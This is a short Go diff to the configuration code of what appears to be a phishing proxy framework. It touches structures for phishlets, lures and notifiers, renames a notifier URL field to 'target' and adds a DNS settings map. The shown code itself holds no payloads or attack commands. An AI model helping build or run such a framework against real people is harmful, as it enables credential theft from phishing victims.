@@ -29,7 +29,7 @@ type Lure struct {
 type Notify struct {
 	Enabled           bool   `mapstructure:"enabled" yaml:"enabled"`
 	OnEvent           string `mapstructure:"on_event" yaml:"on_event"`
-	Url               string `mapstructure:"url" yaml:"url"`
+	Target            string `mapstructure:"target" yaml:"target"`
 	Method            string `mapstructure:"method" yaml:"method"`
 	AuthHeaderName    string `mapstructure:"auth_header_name" yaml:"auth_header_name"`
 	AuthHeaderValue   string `mapstructure:"auth_header_value" yaml:"auth_header_value"`
@@ -73,6 +73,7 @@ type Config struct {
 	lures             []*Lure
 	notifiers         []*Notify
 	trafficloggers    []*Trafficlogger
+	dnscfg            map[string]string
 	cfg               *viper.Viper
 }
 
@@ -96,6 +97,7 @@ const (
 	CFG_NOTIFIERS          = "notifiers"
 	CFG_TRAFFIC_LOGGERS    = "traffic_loggers"
 	CFG_BLACKLIST_MODE     = "blacklist_mode"
+	CFG_DNS                = "dnscfg"
 )
 
 const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -109,6 +111,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		phishletNames: []string{},
 		lures:         []*Lure{},
 		notifiers:     []*Notify{},
+		dnscfg:        make(map[string]string),
 	}
 
 	c.cfg = viper.New()
@@ -150,6 +153,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.proxyPassword = c.cfg.GetString(CFG_PROXY_PASSWORD)
 	c.proxyEnabled = c.cfg.GetBool(CFG_PROXY_ENABLED)
 	c.blackListMode = c.cfg.GetString(CFG_BLACKLIST_MODE)
+	c.dnscfg = c.cfg.GetStringMapString(CFG_DNS)
 	s_enabled := c.cfg.GetStringSlice(CFG_SITES_ENABLED)
 	for _, site := range s_enabled {
 		c.sitesEnabled[site] = true
